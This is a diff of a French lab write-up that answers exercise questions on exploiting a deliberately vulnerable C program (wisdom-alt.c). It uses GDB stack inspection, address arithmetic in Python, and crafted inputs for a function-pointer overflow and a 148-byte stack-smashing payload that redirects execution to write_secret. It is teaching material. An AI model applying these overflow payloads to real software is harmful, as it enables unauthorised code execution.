@@ -65,7 +65,7 @@ fptr  ptrs[3] = { NULL, get_wisdom, put_wisdom };
 
 ## Question 4
 
-```
+```c
 fptr tmp = ptrs[s]; // on peut overflow
 tmp();
 ```
@@ -105,7 +105,7 @@ $6 = (fptr *) 0xbffff804
 
 En python : 
 
-```
+```py
 >>> ptrs = 0x804a0d4
 >>> p = 0xbffff804
 >>> (p-ptrs)//4
@@ -119,7 +119,7 @@ Note : `//` est l'opérateur de division entière en python.
 
 ## Question 10
 
-```
+```py
 >>> ptrs = 0x804a0d4
 >>> buf = 0xbffff400
 >>> (buf-ptrs + 64)//4
@@ -128,12 +128,12 @@ Note : `//` est l'opérateur de division entière en python.
 
 ## Question 11
 
-```
+```py
 >>> ptrs = 0x804a0d4
 >>> write_secret = 0x8048534
 ```
 
-Donc on écrit en input :
+Donc on écrit en input (en s'appuyant sur la réponse de la question 10) :
 ```
 771675355\x00AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA\x34\x85\x04\x8
 ~~~~~~~~~ ~~~ ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~ ~~~~~~~~~~~~~~
@@ -145,6 +145,22 @@ adresse   fin  On remplit buf pour atteindre buf[64]                adresse de
 ```
 
 ## Question 12
+<!-- Suppose you wanted to overflow the wis variable to perform a
+stack smashing attack. You could do this by entering 2 to
+call put_wisdom, and then enter enough bytes to overwrite the
+return address of that function, replacing it with the address
+of write_secret. How many bytes do you need to enter prior to
+the address of write_secret?
+To work out the answer here, you might find it useful to use the
+GDB backtrace command, which prints out the current stack, and
+the x command, which prints a "hex dump" of the bytes at a given
+address. For example, by typing x/48xw $esp you would print out
+48 words (the w) in hexadecimal format (the x) starting at the
+address stored in register $esp. -->
+
+Dans un premier temps, on va mettre un *breakpoint* sur la ligne 62 de `wisdom-alt.c` pour voir l'état de la *stack* au moment où `gets` est appelé.
+
+On récupère au passage toutes les adresses qui nous intéressent.
 
 ```
 (gdb) break wisdom-alt.c:62
@@ -175,8 +191,15 @@ $2 = (char (*)[128]) 0xbffff348
 #1  0x0804880d in main () at wisdom-alt.c:102
 ```
 
-```
->>> r = r"""0x00000000      0x00000000 0x00000000      0x00000000      0x00000000      0x00000000 0x00000000      0x00000000      0x00000000      0x00000000 0x00000000      0x00000000      0x00000000      0x00000000 0x00000000      0x00000000      0x00000000      0x00000000 0x00000000      0x00000000      0x00000000      0x00000000 0x00000000      0x00000000      0x00000000      0x00000000 0x00000000      0x00000000      0x00000000      0x00000000 0x00000000      0x00000000      0x00000012      0xbffff400 0x00000000      0xbffff800      0xbffff818""" # entre 0xbffff348 (&wis) et 0x0804880d (& de retour, pointe dans main)
+Je cherche ensuite le nombre d'octets entre `&wis` et l'adresse de retour de `put_wisdom` (qui est `0x0804880d`, dans la fonction `main`).
+
+On peu enfin calculer le nombre d'octets à mettre dans `buf` pour réécrire l'adresse de retour de `put_wisdom` par celle de `write_secret`.
+
+On écrit `A\x00` avant de remplir le reste de la mémoire pour que `gets` puisse lire, et on ajoute `r"\x34\x85\x04\x08"` à la fin pour écrire l'adresse de `write_secret` en little-endian.
+
+```py
+>>> r = r"""0x00000000      0x00000000 0x00000000      0x00000000      0x00000000      0x00000000 0x00000000      0x00000000      0x00000000      0x00000000 0x00000000      0x00000000      0x00000000      0x00000000 0x00000000      0x00000000      0x00000000      0x00000000 0x00000000      0x00000000      0x00000000      0x00000000 0x00000000      0x00000000      0x00000000      0x00000000 0x00000000      0x00000000      0x00000000      0x00000000 0x00000000      0x00000000      0x00000012      0xbffff400 0x00000000      0xbffff800      0xbffff818""" 
+>>> # entre 0xbffff348 (&wis) et 0x0804880d (& de retour, pointe dans main)
 >>> len(r.split()) * 4
 148
 >>> print(r"A\x00" + "A"*(148-2) + r"\x34\x85\x04\x08") # 2 octets pour que gets() puisse lire, padding, et &write_secret little-endian
